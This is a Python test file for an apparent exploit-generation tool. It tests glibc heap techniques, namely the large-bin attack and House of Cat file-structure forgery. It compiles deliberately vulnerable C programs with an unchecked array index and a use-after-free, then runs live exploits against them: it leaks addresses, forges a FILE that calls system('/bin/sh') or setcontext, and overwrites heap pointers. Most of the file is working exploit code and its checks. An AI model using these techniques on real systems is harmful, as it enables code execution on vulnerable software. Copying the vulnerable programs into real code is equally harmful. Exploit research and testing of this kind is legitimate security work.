"""The large-bin attack, House of Cat, and the check that decides which of them is possible.

The point of this module is that one fact -- whether glibc's large-bin insertion still writes
unchecked -- is read out of the libc's BYTES rather than looked up in a version table, and that
the honest consequence is reported when the answer is no.
"""
import glob
import select
import shutil
import struct
import subprocess
import time

import pytest
from lykos.analyze.poc import aaheg, heap

_SYS_LIBC = next(iter(glob.glob("/usr/lib/x86_64-linux-gnu/libc.so.6")
                      + glob.glob("/lib/x86_64-linux-gnu/libc.so.6")), None)


def test_largebin_index_groups_the_two_chunks_together():
    """The attack needs a resident chunk to corrupt, so both chunks must land in one bin."""
    assert heap.largebin_index(0x430) == heap.largebin_index(0x420) == 64
    assert heap.largebin_index(0x440) == 65                   # the next 64-byte band
    # bin_at(i) == bin_at(1) + (i-1)*0x10, and bin_at(1) is what unsorted_bin_offset measures.
    assert heap.large_bin_bin_head(0x1E7AC8, 0x430) == 0x1E7AC8 + 63 * 0x10


def test_large_bin_guard_counts_sites_in_the_bytes():
    """Two guard sites means both insertion branches check, and the technique stops being an
    arbitrary write. The count comes from the jumps that reach the error string's loader, so it
    does not depend on the compiler's register choices or on a version table."""
    if not _SYS_LIBC:
        pytest.skip("no system libc")
    g = heap.large_bin_guard(open(_SYS_LIBC, "rb").read())
    assert g["sites"] in (0, 1, 2), g
    assert g["arbitrary"] is (g["sites"] < 2)
    assert g["glibc"] != "?" and g["reason"]
    if g["sites"] >= 2:
        # The guard reads `*(bk_nextsize + 0x20)`, which is the slot the write then overwrites.
        assert "pointer swap" in g["reason"]


def test_large_bin_guard_on_an_unguarded_build_if_one_is_present():
    """Any second glibc on this box is a free differential: an older build should report the short
    branch unguarded. Skipped when there is only one libc to look at."""
    others = [p for p in glob.glob("/home/kali/.cache/*/glibc/libc.so.6")
              if heap.large_bin_guard(open(p, "rb").read()).get("sites") == 1]
    if not others:
        pytest.skip("no second glibc with an unguarded short branch on this host")
    g = heap.large_bin_guard(open(others[0], "rb").read())
    assert g["arbitrary"] is True and "unchecked" in g["reason"]


def test_aaheg_large_bin_verdict_follows_the_libc_it_is_given():
    """The knowledge base must say different things for different libcs, and must say "unknown"
    rather than guess when it was handed no bytes."""
    if not _SYS_LIBC:
        pytest.skip("no system libc")
    ld = open(_SYS_LIBC, "rb").read()
    guard = heap.large_bin_guard(ld)
    v = aaheg.Vuln("uaf", size=0x450)

    def entry(env):
        r = aaheg.plan_exploit(v, aaheg.Goal("arbitrary_write"), env)
        return next(a for a in r["advisory_alternatives"] if a["technique"] == "large_bin_attack")

    measured = entry(aaheg.Env(glibc=(2, 43), libc_data=ld))
    blind = entry(aaheg.Env(glibc=(2, 43)))
    assert "unverified" in blind["primitive"]
    assert any("UNKNOWN" in p for p in blind["preconditions"])
    if guard["arbitrary"] is False:
        assert "NOT an arbitrary write" in measured["primitive"]
        assert any("BLOCKED as an arbitrary write" in p for p in measured["preconditions"])
    else:
        assert "unverified" not in measured["primitive"]
    assert measured["primitive"] != blind["primitive"]


def test_build_house_of_cat_lays_out_all_three_structures():
    """A FILE, its _IO_wide_data and its fake _wide_vtable, in one blob, so a caller that can
    write a run of bytes delivers the whole forgery and then one pointer."""
    off = heap.cat_offsets()
    b = heap.build_house_of_cat(0x404100, wfile_jumps=0xAAAA, system=0xBBBB)

    def q(o):
        return struct.unpack("<Q", b[o:o + 8])[0]

    assert len(b) == heap.CAT_BLOB_MIN
    assert b[0:8] == b" /bin/sh"                      # _flags doubles as the command
    assert q(0x88) == 0x404100 + off["lock"]          # _lock -> zeroed bytes inside the blob
    assert q(0x68) == 0                               # _chain: the walk stops after us
    assert q(0xA0) == 0x404100 + off["wide"]          # _wide_data
    assert q(0xC0) == 1                               # _mode > 0 -> the WIDE pair gates the flush
    assert q(0xD8) == 0xAAAA                          # vtable == _IO_wfile_jumps
    assert q(off["wide"] + 0x18) == 0                 # wide _IO_write_base
    assert q(off["wide"] + 0x20) == 1                 # wide _IO_write_ptr > write_base
    assert q(off["wide"] + 0x30) == 0                 # wide _IO_buf_base == NULL
    assert q(off["wide"] + 0xE0) == 0x404100 + off["vt"]
    assert q(off["vt"] + 0x68) == 0xBBBB              # the fake __doallocate


def test_build_house_of_cat_setcontext_plan_sets_user_lock():
    """On the setcontext finish fp+0x88 is gregs[RDX], so it cannot also be a lock pointer --
    _IO_USER_LOCK is what frees it."""
    f = {"rdi": 0x68, "rsi": 0x70, "rdx": 0x88}
    b = heap.build_house_of_cat(0x404100, wfile_jumps=0xAAAA, plan="setcontext",
                                setcontext=0xCCCC, fields=f, rip_at=0xA8, rip=0xEEEE,
                                rdi=0xB105, rsi=0, rdx=0)

    def q(o):
        return struct.unpack("<Q", b[o:o + 8])[0]

    assert q(0x00) == 0x8000 and q(0x88) == 0        # _IO_USER_LOCK; gregs[RDX] = 0
    assert q(0x68) == 0xB105 and q(0xA8) == 0xEEEE
    assert q(heap.cat_offsets()["vt"] + 0x68) == 0xCCCC


def test_build_house_of_cat_refuses_a_blob_too_small():
    with pytest.raises(AssertionError):
        heap.build_house_of_cat(0x404100, wfile_jumps=1, system=1, size=0x100)


def test_house_of_cat_targets_name_io_list_all():
    if not _SYS_LIBC:
        pytest.skip("no system libc")
    T = heap.house_of_cat_targets(open(_SYS_LIBC, "rb").read())
    assert T["list_all"] > 0 and T["wfile_jumps"] > 0 and T["system"] > 0
    assert T["blob_min"] == heap.CAT_BLOB_MIN and T["plan"] == "system"


_STDERR_MENU = r'''#include <stdio.h>
long table[128];
int main(void){ setvbuf(stdout,0,2,0);
  for(;;){ fprintf(stderr, "1.set 2.get 3.exit\n> ");
    int o; if(scanf("%d",&o)!=1) return 0;
    if(o==1){ long i,v; fprintf(stderr, "idx: "); if(scanf("%ld",&i)!=1) return 0;
              fprintf(stderr, "val: "); if(scanf("%ld",&v)!=1) return 0;
              table[i]=v; }
    else if(o==2){ long i; fprintf(stderr, "idx: "); if(scanf("%ld",&i)!=1) return 0;
                   printf("%ld\n", table[i]); }
    else return 0; } }
'''


def test_cat_plan_wins_where_forging_glibcs_own_file_cannot(tmp_path):
    """The live fallthrough. This target PROMPTS ON STDERR, so `_IO_2_1_stderr_` is read by the
    program between our cells and both plans that forge it execute a half-built FILE. House of Cat
    forges nothing of glibc's: it builds the whole FILE inside the target's own array and writes
    one pointer, `_IO_list_all`."""
    from lykos.analyze.dynamic import sandbox
    from lykos.analyze.poc import exploit, leak, rop
    if sandbox.host_arch() != "x86-64" or not _SYS_LIBC:
        pytest.skip("x86-64 + system libc required")
    gcc = shutil.which("gcc") or shutil.which("cc")
    if not gcc:
        pytest.skip("no C compiler")
    (tmp_path / "t.c").write_text(_STDERR_MENU)
    exe = tmp_path / "idx"
    if subprocess.run([gcc, "-no-pie", "-fno-stack-protector", "-O0", "-w", str(tmp_path / "t.c"),
                       "-o", str(exe)], capture_output=True).returncode:
        pytest.skip("build failed")
    blob = exe.read_bytes()
    table, size = exploit.elf_objects_sized(blob)["table"]
    assert size >= heap.CAT_BLOB_MIN
    res = leak.indexed_write_fsop(
        exe, tmp_path,
        write_cell=lambda a, v: b"1\n%d\n%d\n" % ((a - table) // 8,
                                                  struct.unpack("<q", struct.pack("<Q", v))[0]),
        read_cell=lambda a: b"2\n%d\n" % ((a - table) // 8),
        libc_data=open(_SYS_LIBC, "rb").read(),
        leak_slots=[(a, n) for n, a in rop.got_entries(blob).items()],
        scratch=table, scratch_size=size, exit_seqs=(b"3\n",))
    assert res["ok"], res.get("reason")
    assert res["plan"] == "cat", res.get("plans_tried")
    assert res["plans_tried"] == ["setcontext", "system", "cat"]
    assert res["finish"] in ("setcontext", "system")
    # The last cell is the single pointer that does it.
    assert int(res["cells"][-1][1], 16) == table


def test_cat_plan_is_unavailable_without_room_for_the_blob(tmp_path):
    """A 128-byte array cannot hold a FILE, and the plan must drop out rather than write a
    truncated forgery."""
    from lykos.analyze.poc import leak
    res = leak.indexed_write_fsop(
        tmp_path / "nope", tmp_path, write_cell=lambda a, v: b"", read_cell=lambda a: b"",
        libc_data=b"", leak_slots=[(0x404000, "printf")], scratch=0x404060,
        scratch_size=0x80, plans=("cat",))
    assert not res["ok"]
    assert "libc" in res["reason"] or "FSOP plan" in res["reason"]


def test_large_bin_write_lands_only_when_the_guard_is_satisfied(tmp_path):
    """The measurement behind the verdict, both ways, live.

    On a libc that guards both insertion branches the check is
    `fwd->bk_nextsize->fd_nextsize == fwd`, which reads `*TARGET` -- the slot the write then
    overwrites. So: with `*TARGET` left alone the target must die with glibc's own nextsize
    message, and with `*TARGET` pre-seeded to the resident chunk's address the write must land.
    Anything else and the stated primitive is wrong."""
    from lykos.analyze.dynamic import sandbox
    if sandbox.host_arch() != "x86-64" or not _SYS_LIBC:
        pytest.skip("x86-64 + system libc required")
    gcc = shutil.which("gcc") or shutil.which("cc")
    if not gcc:
        pytest.skip("no C compiler")
    guard = heap.large_bin_guard(open(_SYS_LIBC, "rb").read())
    if guard["arbitrary"] is not False:
        pytest.skip(f"this glibc does not guard both branches ({guard['reason']})")
    src = r'''#include <stdio.h>
#include <stdlib.h>
#define N 16
static char *slot[N]; static size_t len[N];
static long rd(void){ long v; if(scanf("%ld",&v)!=1) exit(0); return v; }
int main(void){ setvbuf(stdout,0,2,0);
  for(;;){ printf("1.add 2.free 3.view 4.edit 5.exit\n> ");
    long o = rd();
    if(o==1){ printf("idx: "); long i=rd(); printf("size: "); long s=rd();
              if(i<0||i>=N||s<0x418||s>0x1008){ printf("bad\n"); continue; }
              slot[i]=malloc(s); len[i]=s; printf("ok\n"); }
    else if(o==2){ printf("idx: "); long i=rd(); if(i<0||i>=N) continue;
                   free(slot[i]); printf("ok\n"); }
    else if(o==3){ printf("idx: "); long i=rd(); if(i<0||i>=N||!slot[i]) continue;
                   printf("data: "); fwrite(slot[i],1,len[i],stdout); printf("\n"); }
    else if(o==4){ printf("idx: "); long i=rd(); if(i<0||i>=N||!slot[i]) continue;
                   printf("data: "); getchar();
                   if(fread(slot[i],1,len[i],stdin)!=len[i]) exit(0);
                   printf("ok\n"); }
    else return 0; } }
'''
    (tmp_path / "t.c").write_text(src)
    exe = tmp_path / "nb"
    if subprocess.run([gcc, "-no-pie", "-fno-stack-protector", "-O0", "-w", str(tmp_path / "t.c"),
                       "-o", str(exe)], capture_output=True).returncode:
        pytest.skip("build failed")
    unsorted = heap.unsorted_bin_offset(_SYS_LIBC)
    if not unsorted:
        pytest.skip("could not measure main_arena+0x60 for this libc")
    head = heap.large_bin_bin_head(unsorted, 0x430)
    SZ, SZ2, BIG = 0x428, 0x418, 0x1008

    def attempt(seed_target):
        p = subprocess.Popen([str(exe)], stdin=subprocess.PIPE, stdout=subprocess.PIPE,
                             stderr=subprocess.STDOUT, start_new_session=True)

        def op(seq, secs=0.35):
            if p.poll() is not None:
                return b""
            p.stdin.write(seq)
            p.stdin.flush()
            out, end = b"", time.time() + secs
            while time.time() < end:
                if select.select([p.stdout], [], [], 0.05)[0]:
                    b = p.stdout.read1(1 << 20)
                    if not b:
                        break
                    out += b
            return out

        def words(out, n=4):
            parts = out.split(b"data: ", 1)
            if len(parts) < 2:
                return []
            return [struct.unpack("<Q", parts[1][o:o + 8])[0] for o in range(0, 8 * n, 8)]

        try:
            op(b"", 0.3)
            for i, sz in ((0, SZ), (1, SZ), (2, SZ2), (3, SZ), (5, SZ)):
                op(b"1\n%d\n%d\n" % (i, sz))
            op(b"2\n0\n")                                 # free L1 -> unsorted
            op(b"1\n4\n%d\n" % BIG)                       # the scan sorts L1 into the large bin
            w = words(op(b"3\n0\n", 0.5))
            if len(w) < 4:
                return None, "no view of the freed chunk"
            base = next((v - head for v in w[:2]
                         if v > 0x7F0000000000 and (v - head) % 0x1000 == 0), None)
            chunk_l1 = next((v for v in w[2:4] if 0 < v < 0x7F0000000000), None)
            if not (base and chunk_l1):
                return None, "leak failed"
            chunk_l2 = chunk_l1 + 0x430 + 0x430
            target = chunk_l1 + 0x430 + 0x430 + 0x420 + 0x430 + 0x10      # slot 5's data
            if seed_target:
                op(b"4\n5\n" + struct.pack("<Q", chunk_l1).ljust(SZ, b"\x00"))
            op(b"4\n0\n" + struct.pack("<QQQQ", w[0], w[1], w[2], target - 0x20).ljust(SZ, b"\x00"))
            op(b"2\n2\n")                                 # free L2 -> unsorted
            out = op(b"1\n8\n%d\n" % BIG, 0.6)            # the insertion runs
            if b"nextsize" in out or p.poll() is not None:
                return "aborted", out
            got = words(op(b"3\n5\n", 0.5), 1)
            return ("wrote" if got and got[0] == chunk_l2 else "no-write"), out
        finally:
            sandbox.kill_quietly(p)

    unseeded, out1 = attempt(False)
    assert unseeded == "aborted", f"expected glibc to refuse the insertion, got {unseeded!r}"
    assert b"nextsize" in out1, out1[-120:]
    seeded, _ = attempt(True)
    assert seeded == "wrote", f"with the guard satisfied the write must land, got {seeded!r}"
